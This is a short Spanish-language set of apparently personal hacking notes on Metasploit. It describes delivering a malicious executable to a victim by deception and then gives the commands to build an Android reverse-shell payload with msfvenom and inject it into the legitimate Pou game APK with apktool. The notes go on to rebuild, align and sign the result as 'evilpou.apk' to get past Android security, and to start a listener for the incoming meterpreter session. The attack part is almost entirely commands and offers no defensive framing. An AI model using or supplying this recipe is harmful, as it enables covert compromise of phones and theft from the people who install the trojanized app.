
---

## Payload con Metasploit 

### Flujo completo del ataque 
1. Se crea virus.exe con msfvenom 
2. Se envía el archivo a la víctima (por USB, engaño, etc.) 
3. Víctima ejecuta el archivo 
4. Kali escucha con exploit 
5. Se abre sesión meterpreter 
6. Se toman acciones dentro del sistema víctima

### Para el celular 
```
ifconfig  
```
Para ver mi IP

```
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.18 LPORT=333 -o payload.apk
```
Para crear el Payload

Descompilar el apk malicioso, solo para obtener el reverse shell para insertarlo en el apk legítimo

```
apktool d Pou-1.4.122.apk
```
```
apktool d payload.apk
```

Llamar al payload desde el apk legítimo 
```
invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
```

Guardar la carpeta metasploit dentro del apk legítimo 

Construir nuevamente el apk 
```
apktool b Pou-1.4.122 -o evilpou.apk
```

Se genera la firma para evadir la seguridad de Android 
Alinear el apk, antes de firmar 
```
zipalign -v 4 evilpou.apk evilpou_alineada.apk
```

Se genera la llave para firmar
```
keytool -genkeypair -v \ 
	-keystore mi_clave.jks \
	-keyalg RSA \ 
	-keysize 2048 \ 
	-validity 10000 \ 
	-alias mi_alias
```

Ahora si se firma el apk
```
apksigner sign --ks mi_clave.jks --ks-key-alias mi_alias --out FINAL_POU_EVIL.APK evilpou_alineada.apk
```


msfconsole

se exploit/multi/handler

set payload android/meterpreter/reverse_tcp

set LHOST 192.168.0.18

set LPORT 333


